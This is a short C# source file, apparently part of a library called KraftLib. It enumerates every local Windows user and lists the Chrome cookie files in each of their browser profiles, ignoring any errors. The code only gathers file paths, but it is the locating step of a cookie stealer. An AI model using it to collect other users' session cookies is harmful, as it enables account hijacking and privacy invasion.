using System;
using System.Collections.Generic;
using System.DirectoryServices;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace KraftLib
{
    class Browsers
    {
        /// <summary>
        /// get chrome cookie files for all profiles
        /// </summary>
        /// <author>mrkoolaid</author>
        /// <tested>windows 7</tested>
        /// <returns>generic string list of cookie files</returns>
        public List<string> getCookieFiles()
        {
            List<string> cookie_files = new List<string>() { };
            var path = string.Format("WinNT://{0},computer", Environment.MachineName);
            using (var computerEntry = new DirectoryEntry(path))
            {
                foreach (DirectoryEntry childEntry in computerEntry.Children)
                {
                    if (childEntry.SchemaClassName == "User")
                    {
                        try
                        {
                            string[] dirs = Directory.GetDirectories(@"C:\Users\" + childEntry.Name + @"\AppData\Local\Google\Chrome\User Data\");
                            foreach (string dir in dirs)
                            {
                                if (dir.Contains("Profile"))
                                {
                                    string[] files = Directory.GetFiles(dir);
                                    foreach (string file in files)
                                    {
                                        if (file.Contains("Cookie"))
                                        {
                                            if (File.Exists(file))
                                            {
                                                cookie_files.Add(file);
                                            }
                                        }
                                    }
                                }
                            }
                        }
                        catch { }
                    }
                }
            }
            return cookie_files;
        }
    }
}
